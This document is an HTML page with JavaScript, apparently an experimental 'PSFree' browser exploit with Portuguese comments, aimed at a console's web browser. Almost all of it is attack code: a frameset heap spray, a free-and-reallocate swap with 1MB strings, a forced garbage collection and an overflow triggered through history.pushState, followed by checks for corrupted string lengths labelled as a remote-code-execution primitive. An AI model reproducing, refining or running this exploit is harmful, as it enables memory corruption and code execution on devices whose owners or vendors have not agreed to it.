<!DOCTYPE html>
<html>
<head>
    <title>PSFree Architecture: 1MB Edition</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; padding: 20px; }
        button { font-size: 24px; padding: 20px; width: 100%; border: 2px solid #0f0; background: #111; color: #fff; cursor: pointer; }
        #log { border: 1px solid #333; height: 400px; overflow-y: scroll; padding: 10px; color: cyan; font-size: 14px; margin-top: 20px;}
        .win { background-color: #00ff00; color: #000; font-weight: bold; font-size: 1.5em; padding: 10px; border: 4px solid white; }
    </style>
</head>
<body>

    <h1>PSFree Architecture: 1MB Edition</h1>
    <p>Frameset para Spray -> Strings para Vítima -> Error para Detecção.</p>

    <button onclick="startArchitectedAttack()">INICIAR PROTOCOLO PSFREE</button>
    
    <div id="log">Pronto. Reinicie o console.</div>

    <script>
        const BASE_OFFSET = 709520; 
        const OVERFLOW_AMT = 1024 * 64; 

        // CONFIGURAÇÃO 1MB
        const TARGET_SIZE = 1024 * 1024; 
        const PAYLOAD_SIZE = TARGET_SIZE - 24; 

        // Cálculo do Frameset (Para abrir o buraco certo)
        const FS_ELEMENTS = (TARGET_SIZE / 8) - 2;
        const FS_ROWS = ",".repeat(FS_ELEMENTS);

        var victims_fs = [];
        var victims_str = [];

        function log(msg, type) {
            const el = document.getElementById('log');
            let cls = type === 'win' ? 'class="win"' : '';
            el.innerHTML += `<div ${cls}>[${new Date().toLocaleTimeString()}] ${msg}</div>`;
            el.scrollTop = el.scrollHeight;
        }

        async function startArchitectedAttack() {
            log("--- FASE 1: SPRAY DE FRAMESET (Preparando Terreno) ---");
            
            // 1. Alocar Framesets
            // Eles vão ocupar os slots de 1MB no Heap
            const SPRAY_COUNT = 80;
            victims_fs = [];
            
            try {
                for(let i=0; i<SPRAY_COUNT; i++) {
                    let fset = document.createElement('frameset');
                    fset.rows = FS_ROWS;
                    victims_fs.push(fset);
                }
            } catch(e) {
                log("Erro no Spray FS: " + e.message);
                return;
            }

            log("--- FASE 2: SWAP (Trocando Frameset por String) ---");
            
            // Preparar a String Vítima (1MB TextDecoder)
            let rawBuffer = new Uint8Array(PAYLOAD_SIZE);
            rawBuffer.fill(0x42); 
            let decoder = new TextDecoder("utf-8");
            let baseString = decoder.decode(rawBuffer);

            // 2. O Pulo do Gato: Deleta Frameset, Cria String
            // Fazemos isso intercalado para maximizar a chance de reuso
            victims_str = [];
            
            for(let i=0; i<SPRAY_COUNT; i+=2) {
                // Libera o Frameset (Cria o buraco)
                victims_fs[i].rows = ""; 
                victims_fs[i] = null;
                
                // Imediatamente aloca a String (Tenta pegar o buraco)
                // Usamos a técnica do PSFree de criar strings únicas
                let s = i + "_" + baseString.substring((i+"_").length);
                victims_str.push(s);
            }

            // Força GC para consolidar a troca
            await forceGC();

            log("--- FASE 3: EXPLOIT (Overflow) ---");

            setTimeout(() => {
                try {
                    let buffer = "A".repeat(BASE_OFFSET);
                    buffer += "\x01".repeat(OVERFLOW_AMT);
                    
                    history.pushState({}, "pwn", "/" + buffer);

                    log("Verificando Strings...");
                    checkStrings(PAYLOAD_SIZE);

                } catch (e) {
                    log("Erro: " + e.message);
                }
            }, 500);
        }

        function checkStrings(expectedLen) {
            let success = false;
            for(let i=0; i<victims_str.length; i++) {
                let s = victims_str[i];
                if(!s) continue;

                try {
                    // TRUQUE DO PSFREE: Error Message
                    let err = new Error(s);
                    let msg = err.message;

                    // SUCESSO ABSOLUTO (RCE)
                    if (msg.length !== expectedLen) {
                        log(`!!! JACKPOT !!! String ${i} Length Corrompido!`, 'win');
                        log(`Novo Tamanho: ${msg.length}`, 'win');
                        alert("RCE PRIMITIVE UNLOCKED!");
                        success = true;
                        break;
                    }

                    // SUCESSO PARCIAL (DADOS)
                    if (msg.charCodeAt(0) !== 66) {
                        log(`[SUCESSO PARCIAL] DADOS Atingidos na String ${i}!`, 'win');
                        success = true;
                        break;
                    }
                } catch(e) {}
            }
            if(!success) log("Nada atingido.");
        }

        async function forceGC() {
            try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
            return new Promise(r => setTimeout(r, 800));
        }
    </script>
</body>
</html>
